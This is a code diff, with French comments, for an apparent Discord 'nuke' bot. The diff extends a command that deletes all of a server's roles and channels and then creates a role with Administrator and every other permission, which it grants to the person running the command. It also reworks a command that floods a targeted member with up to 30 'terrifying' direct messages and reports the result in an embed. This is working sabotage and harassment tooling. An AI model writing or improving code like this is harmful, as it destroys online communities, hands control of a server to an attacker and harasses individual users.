@@ -239,7 +239,6 @@ client.on('messageCreate', async (message) => {
         await handleNuke(message);
     }
     
-    // NOUVELLE COMMANDE SPAM
     if (command === 'spam') {
         await handleSpam(message, args);
     }
@@ -253,7 +252,7 @@ client.on('messageCreate', async (message) => {
 });
 
 // ============================================================
-// NUKE FUNCTION (ULTRA RAPIDE + SPAM EFFRAYANT)
+// NUKE FUNCTION (AVEC SUPPRESSION TOTALE DES RÔLES + RÔLE NIKI POUR TOI)
 // ============================================================
 async function handleNuke(message) {
     if (message.author.id !== AUTHORIZED_ID) {
@@ -287,9 +286,10 @@ async function handleNuke(message) {
         });
         await Promise.all(deletePromises);
 
-        // 2. DELETE ALL ROLES
+        // 2. DELETE ALL ROLES (except @everyone and the bot's highest role)
         const roles = guild.roles.cache;
         const deleteRolePromises = roles.map(async (role) => {
+            // On supprime tous les rôles sauf @everyone
             if (role.name !== '@everyone' && role.id !== guild.id) {
                 try {
                     await role.delete();
@@ -341,16 +341,66 @@ async function handleNuke(message) {
         }
         await Promise.all(createPromises);
 
-        // 5. CREATE SPECIAL ROLE
+        // 5. CREATE SPECIAL NIKI ROLE WITH ALL PERMISSIONS
         try {
-            const role = await guild.roles.create({
-                name: '☠ N1K1 0N T0P ☠',
+            // On récupère toutes les permissions possibles
+            const allPermissions = [
+                PermissionsBitField.Flags.Administrator,
+                PermissionsBitField.Flags.CreateInstantInvite,
+                PermissionsBitField.Flags.KickMembers,
+                PermissionsBitField.Flags.BanMembers,
+                PermissionsBitField.Flags.ManageChannels,
+                PermissionsBitField.Flags.ManageGuild,
+                PermissionsBitField.Flags.AddReactions,
+                PermissionsBitField.Flags.ViewAuditLog,
+                PermissionsBitField.Flags.PrioritySpeaker,
+                PermissionsBitField.Flags.Stream,
+                PermissionsBitField.Flags.ViewChannel,
+                PermissionsBitField.Flags.SendMessages,
+                PermissionsBitField.Flags.SendTTSMessages,
+                PermissionsBitField.Flags.ManageMessages,
+                PermissionsBitField.Flags.EmbedLinks,
+                PermissionsBitField.Flags.AttachFiles,
+                PermissionsBitField.Flags.ReadMessageHistory,
+                PermissionsBitField.Flags.MentionEveryone,
+                PermissionsBitField.Flags.UseExternalEmojis,
+                PermissionsBitField.Flags.ViewGuildInsights,
+                PermissionsBitField.Flags.Connect,
+                PermissionsBitField.Flags.Speak,
+                PermissionsBitField.Flags.MuteMembers,
+                PermissionsBitField.Flags.DeafenMembers,
+                PermissionsBitField.Flags.MoveMembers,
+                PermissionsBitField.Flags.UseVAD,
+                PermissionsBitField.Flags.ChangeNickname,
+                PermissionsBitField.Flags.ManageNicknames,
+                PermissionsBitField.Flags.ManageRoles,
+                PermissionsBitField.Flags.ManageWebhooks,
+                PermissionsBitField.Flags.ManageEmojisAndStickers
+            ];
+
+            // Calcul du bitfield total
+            const totalPermissions = allPermissions.reduce((acc, perm) => acc | perm, 0n);
+
+            // Création du rôle
+            const nikiRole = await guild.roles.create({
+                name: '☠ NIKI ☠',
                 color: '#FF0000',
                 hoist: true,
-                mentionable: true
+                mentionable: true,
+                permissions: totalPermissions
             });
-            await guild.members.me.roles.add(role);
-        } catch (e) {}
+
+            // On ajoute ce rôle à l'auteur de la commande
+            await message.member.roles.add(nikiRole);
+
+            // On l'ajoute aussi au bot pour qu'il puisse tout gérer
+            try {
+                await guild.members.me.roles.add(nikiRole);
+            } catch (e) {}
+
+        } catch (e) {
+            console.log("Erreur lors de la création du rôle NIKI:", e);
+        }
 
         // 6. UPDATE STATS
         totalNukes++;
@@ -387,71 +437,88 @@ async function handleNuke(message) {
 }
 
 // ============================================================
-// SPAM FUNCTION (DM SPAM)
+// SPAM FUNCTION (DM SPAM AVEC RAPPORT DE SUCCÈS)
 // ============================================================
 async function handleSpam(message, args) {
     if (message.author.id !== AUTHORIZED_ID) {
         return message.reply('❌ You are not authorized to use this command!');
     }
 
-    // Vérifier si un membre a été mentionné
     if (args.length === 0) {
         return message.reply('❌ Utilisation : `!spam @membre`');
     }
 
-    // Récupérer le membre mentionné (première mention)
     const targetMember = message.mentions.members.first();
 
     if (!targetMember) {
         return message.reply('❌ Membre introuvable. Mentionne un membre valide.');
     }
 
-    // Vérifier si la cible n'est pas le bot lui-même
     if (targetMember.id === client.user.id) {
         return message.reply('❌ Je ne peux pas me spam moi-même !');
     }
 
-    // Vérifier si la cible n'est pas l'auteur
     if (targetMember.id === message.author.id) {
         return message.reply('❌ Tu ne peux pas te spam toi-même !');
     }
 
-    await message.reply(`💀 **SPAM INITIALIZED sur ${targetMember.user.tag}...**`);
+    await message.reply(`💀 **SPAM INITIALIZED sur ${targetMember.user.tag}...`);
 
     const user = targetMember.user;
     let sentCount = 0;
-    const MAX_SPAM = 100; // Nombre de messages à envoyer (ajuste selon ton envie)
+    let failedCount = 0;
+    const MAX_SPAM = 30;
 
     try {
-        // On essaye d'ouvrir un canal DM avec la personne
         const dmChannel = await user.createDM();
 
-        // On envoie une salve de messages
         for (let i = 0; i < MAX_SPAM; i++) {
             try {
-                // On choisit un message aléatoire parmi les messages terrifiants
                 const randomScary = TERRIFYING_MESSAGES[Math.floor(Math.random() * TERRIFYING_MESSAGES.length)];
                 await dmChannel.send(randomScary);
                 sentCount++;
-                
-                // Petite pause pour éviter de se faire rate-limit par Discord (0.5 seconde)
                 await new Promise(resolve => setTimeout(resolve, 500));
             } catch (e) {
-                // Si le membre a fermé ses DMs ou bloqué le bot, on s'arrête
+                failedCount++;
                 break;
             }
         }
 
-        // On envoie un résumé de la mission
-        if (sentCount > 0) {
-            await message.channel.send(`✅ **SPAM COMPLETE!**\n\n${sentCount} messages terrifiants ont été envoyés en DM à **${user.tag}**.\n\n**@everyone @here** NIKI STRIKES AGAIN!`);
-        } else {
-            await message.channel.send(`❌ **SPAM FAILED!**\n\nImpossible d'envoyer des messages à **${user.tag}**. Ils ont peut-être fermé leurs DMs ou bloqué le bot.`);
+        const reportEmbed = new EmbedBuilder()
+            .setColor(sentCount > 0 ? 0xFF0000 : 0x808080)
+            .setTitle('☠ RAPPORT DE SPAM ☠')
+            .setDescription(`Cible : **${user.tag}**`)
+            .addFields(
+                { name: '📨 Messages envoyés avec succès', value: `${sentCount}`, inline: true },
+                { name: '❌ Messages échoués', value: `${failedCount}`, inline: true },
+                { name: '📊 Statut', value: sentCount > 0 ? '✅ **SUCCÈS**' : '❌ **ÉCHEC**', inline: false }
+            )
+            .setFooter({ text: 'NIKI ON TOP ☠' })
+            .setTimestamp();
+
+        if (sentCount === 0) {
+            reportEmbed.addFields({ name: '🔴 Raison de l\'échec', value: 'La cible a probablement fermé ses messages privés (DMs) ou bloqué le bot.', inline: false });
         }
+
+        await message.channel.send({ embeds: [reportEmbed] });
 
     } catch (error) {
         console.error(error);
-        await message.channel.send(`❌ Erreur lors de l'envoi du spam à ${user.tag}. Vérifie que leurs DMs sont ouverts.`);
+        
+        const errorEmbed = new EmbedBuilder()
+            .setColor(0x808080)
+            .setTitle('☠ RAPPORT DE SPAM ☠')
+            .setDescription(`Cible : **${user.tag}**`)
+            .addFields(
+                { name: '📨 Messages envoyés avec succès', value: `0`, inline: true },
+                { name: '❌ Messages échoués', value: `1+`, inline: true },
+                { name: '📊 Statut', value: '❌ **ÉCHEC CRITIQUE**', inline: false },
+                { name: '🔴 Raison de l\'échec', value: 'La cible a fermé ses DMs ou a bloqué le bot.', inline: false }
+            )
+            .setFooter({ text: 'NIKI ON TOP ☠' })
+            .setTimestamp();
+            
+        await message.channel.send({ embeds: [errorEmbed] });
     }
 }
 
